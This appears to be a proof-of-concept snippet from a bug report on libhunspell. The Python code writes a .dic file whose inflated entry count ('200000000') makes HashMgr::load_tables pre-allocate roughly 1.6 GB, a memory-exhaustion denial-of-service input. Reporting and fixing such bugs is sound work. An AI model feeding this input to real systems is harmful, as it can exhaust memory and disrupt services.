# Minimal hunspell .dic file that triggers ~1.6 GB allocation in
# HashMgr::load_tables (hashmgr.cxx:642). The first line is the claimed
# entry count; libhunspell trusts it and pre-allocates a vector<hentry*>
# of that size before parsing actual entries.
poc = b"200000000\nhello\n"
open('poc.dic', 'wb').write(poc)
